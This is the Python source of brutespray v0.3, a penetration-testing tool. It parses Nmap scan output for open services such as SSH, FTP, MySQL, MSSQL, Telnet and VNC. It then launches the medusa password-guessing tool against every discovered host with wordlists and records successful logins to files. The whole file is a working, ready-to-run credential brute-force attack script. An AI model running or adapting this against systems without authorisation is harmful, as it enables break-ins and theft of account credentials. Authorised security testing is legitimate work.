# -*- coding: utf-8 -*-
from argparse import RawTextHelpFormatter
import sys, time, os
import subprocess
import re
import argparse
import argcomplete
from multiprocessing import Process


services = {}
timestr = time.strftime("%Y%m%d-%H%M")


class colors:
    white = "\033[1;37m"
    normal = "\033[0;00m"
    red = "\033[1;31m"
    blue = "\033[1;34m"
    green = "\033[1;32m"
    lightblue = "\033[0;34m"


banner = colors.red + r"""
              #@                           @/              
           @@@                               @@@           
        %@@@                                   @@@.        
      @@@@@                                     @@@@%      
     @@@@@                                       @@@@@     
    @@@@@@@                  @                  @@@@@@@    
    @(@@@@@@@%            @@@@@@@            &@@@@@@@@@    
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    
     @@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@     
       @@@( @@@@@#@@@@@@@@@*@@@,@@@@@@@@@@@@@@@  @@@       
           @@@@@@ .@@@/@@@@@@@@@@@@@/@@@@ @@@@@@           
                  @@@   @@@@@@@@@@@   @@@                  
                 @@@@*  ,@@@@@@@@@(  ,@@@@                 
                 @@@@@@@@@@@@@@@@@@@@@@@@@                 
                  @@@.@@@@@@@@@@@@@@@ @@@                  
                    @@@@@@ @@@@@ @@@@@@                    
                       @@@@@@@@@@@@@                       
                       @@   @@@   @@                       
                       @@ @@@@@@@ @@                       
                         @@% @  @@                 

"""+'\n' \
+ r"""
██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗  ███████╗██████╔╝██████╔╝███████║ ╚████╔╝ 
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗███████║██║     ██║  ██║██║  ██║   ██║   
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                                                                   
"""+'\n' \
+ '\n brutespray.py v0.3' \
+ '\n Created by: Shane Young/@x90skysn3k && Jacob Robles/@shellfail' + colors.normal + '\n'


def make_dic():
    global services
    port = None
    with open(args.file, 'r') as nmap_file:
        for line in nmap_file:
            supported = ['ssh','ftp','postgres','telnet','mysql','mssql','rsh','vnc','imap','nntp','pcanywhere','pop3','rexec','rlogin','smbnt','smtp','svn','vmauthd']
            for name in supported:
                matches = re.compile(r'([0-9][0-9]*)/open/[a-z][a-z]*//' + name)
                try:
                    port =  matches.findall(line)[0]
                except:
                    continue
    
                ip = re.findall( r'[0-9]+(?:\.[0-9]+){3}', line)
                tmp_ports = matches.findall(line)
                for tmp_port in tmp_ports:
                   if name in services:
                        if tmp_port in services[name]:
                            services[name][tmp_port] += ip
                        else:
                            services[name][tmp_port] = ip
                   else:
                        services[name] = {tmp_port:ip}


def brute(service,port,fname):   
    userlist = 'wordlist/'+service+'/user'
    passlist = 'wordlist/'+service+'/password'
    print service 
    p = subprocess.Popen(['medusa', '-H', fname, '-U', userlist, '-P', passlist, '-M', service, '-t', args.threads, '-n', port, '-T', args.hosts], stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=-1)

    out = "[" + colors.green + "+" + colors.normal + "] "
    output = 'output/' + service + '-success.txt'
    

    for line in iter(p.stdout.readline, b''):
        print line,
        if '[SUCCESS]' in line:
            f = open(output, 'a')
            f.write(out + line)
            f.close()

def parse_args():
    
    parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter, description=\
 
    "Usage: python brutemap.py <OPTIONS> \n")

    menu_group = parser.add_argument_group(colors.lightblue + 'Menu Options' + colors.normal)
    
    menu_group.add_argument('-f', '--file', help="Gnmap file to parse", required=True)
    
    menu_group.add_argument('-s', '--service', help="specify service to attack", default="all")

    menu_group.add_argument('-t', '--threads', help="number of medusa threads", default="2")
    
    menu_group.add_argument('-T', '--hosts', help="number of hosts to test concurrently", default="1")    

    argcomplete.autocomplete(parser)    
   
    args = parser.parse_args()

    
    return args


if __name__ == "__main__":
    print(banner)
    args = parse_args()
    if not os.path.exists("tmp/"):
        os.mkdir("tmp/")
    tmppath = "tmp/"
    filelist = os.listdir(tmppath)
    for filename in filelist:
        os.remove(tmppath+filename)
    if not os.path.exists("output/"):
        os.mkdir("output/")

    make_dic() 
    to_scan = args.service.split(',')
    for service in services:
        if service in to_scan or to_scan == ['all']:
            for port in services[service]:
                fname = 'tmp/'+service + '-' + port
                iplist = services[service][port]
                f = open(fname, 'w+')
                for ip in iplist:
                    f.write(ip + '\n')
                f.close()
                brute_process = Process(target = brute, args=(service,port,fname))
                brute_process.start()
